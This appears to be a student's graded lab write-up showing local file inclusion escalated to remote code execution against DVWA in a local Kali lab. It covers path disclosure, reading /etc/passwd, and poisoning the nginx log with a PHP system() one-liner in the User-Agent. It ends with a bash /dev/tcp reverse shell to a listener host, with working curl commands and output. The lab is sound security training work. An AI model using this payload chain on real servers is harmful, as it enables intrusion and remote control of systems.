# Task 1, Part A — LFI to RCE (20 Marks)

**Environment:** DVWA, Low security, local lab (Kali, DVWA installed via `apt install dvwa`, served by nginx + php-fpm on `127.0.0.1:42001`).

## 1. Baseline and parameter discovery

The File Inclusion module takes a `page` GET parameter:
```
http://127.0.0.1:42001/vulnerabilities/fi/?page=include.php
```

Source of the vulnerable sink (`/usr/share/dvwa/vulnerabilities/fi/index.php`, line 36):
```php
if( isset( $file ) )
    include( $file );
```
`$file` is set directly from `$_GET['page']` in `low.php` with no validation whatsoever.

## 2. The error-message step (path disclosure)

- `?page=` (empty string): PHP 8 throws `Uncaught ValueError: Path must not be empty in /usr/share/dvwa/vulnerabilities/fi/index.php:36` — a PHP 8-specific behavior (empty string rejected outright).
- `?page=asdfasdf` (non-existent file): produces two `Warning: include()` messages:
  ```
  Warning: include(asdfasdf): Failed to open stream: No such file or directory in /usr/share/dvwa/vulnerabilities/fi/index.php on line 36
  Warning: include(): Failed opening 'asdfasdf' for inclusion (include_path='.:/usr/share/php') in /usr/share/dvwa/vulnerabilities/fi/index.php on line 36
  ```
This discloses the absolute installation path (`/usr/share/dvwa/`), the exact vulnerable line (36), and the PHP `include_path`.

Screenshot: `1a-04-path-disclosure-warnings.png`

## 3. Confirming LFI

```
http://127.0.0.1:42001/vulnerabilities/fi/?page=/etc/passwd
```
Returned the full contents of `/etc/passwd`, confirming arbitrary local file read.

Screenshot: `1a-01-lfi-etc-passwd.png`

## 4. RFI is blocked

DVWA reports: *"The PHP function allow_url_include is not enabled."* Classic Remote File Inclusion (pulling a shell from an external URL) is therefore not possible here — this is why the exploitation pivots to local log poisoning instead.

## 5. Log poisoning → RCE

DVWA's nginx vhost logs requests to `/var/log/dvwa/access.log`, including the raw `User-Agent` header, with no sanitization.

**Poison the log** by sending a request whose User-Agent is a PHP one-liner:
```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  -A "<?php system(\$_GET['cmd']); ?>" \
  "http://127.0.0.1:42001/vulnerabilities/fi/?page=include.php"
```

**Trigger execution** by including the poisoned log file via the LFI, passing the command in `cmd`:
```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  "http://127.0.0.1:42001/vulnerabilities/fi/?page=/var/log/dvwa/access.log&cmd=id"
```

Result: `uid=120(_dvwa) gid=120(_dvwa) groups=120(_dvwa)` — confirmed arbitrary command execution as the low-privileged `_dvwa` web service account.

## 6. Reverse shell

Listener on Kali (`192.168.153.128`):
```bash
nc -lvnp 4444
```

Payload (via the same log-poisoning/LFI chain, using a bash `/dev/tcp` reverse shell):
```bash
curl -s -b "PHPSESSID=<session>; security=low" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.153.128/4444 0>&1'" \
  -G "http://127.0.0.1:42001/vulnerabilities/fi/?page=/var/log/dvwa/access.log"
```

Result: interactive shell as `_dvwa@kali`, confirmed with live `id` and `pwd` commands.

Screenshots: `1a-02-reverse-shell-connect.png`, `1a-03-reverse-shell-id-pwd.png`

## 7. Why `nc -e` does not work on modern Kali (one line)

Kali's default `nc` (netcat-traditional/openbsd-netcat) ships **without the `-e` flag compiled in**, since `-e` (execute a program and pipe it to the socket) was deliberately removed from default builds as a security hardening measure against exactly this kind of trivial reverse-shell abuse — hence the pivot to a bash `/dev/tcp` reverse shell, which needs no `-e` support at all.
